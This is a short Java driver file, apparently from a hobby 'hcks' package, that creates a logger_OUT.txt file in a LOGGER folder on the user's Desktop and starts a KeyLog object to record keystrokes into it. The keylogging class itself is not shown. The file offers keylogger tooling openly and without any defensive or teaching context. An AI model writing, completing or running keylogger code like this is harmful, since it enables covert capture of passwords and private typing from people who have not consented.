package hcks;

import java.io.File;
import java.io.IOException;

import uTILS.FileStuff;

public class keyLogTest {

	public static void main(String[] args) {

		File DesktopFile = new File(System.getProperty("user.home") + "/Desktop/LOGGER/logger_OUT.txt");
		
		// -> if you want use following to save unique new file
		// DesktopFile = FileStuff.renameJavaObjFile(DesktopFile);
		
		try {
			
			if (!DesktopFile.exists()) {
				DesktopFile.createNewFile();
			}
			KeyLog logger = new KeyLog();
			
			try {
				logger.startLogger(DesktopFile);
			} catch (IOException e) {
				e.printStackTrace();
			}
		} catch (IOException e1) {
			e1.printStackTrace();
		}
		
	}

}
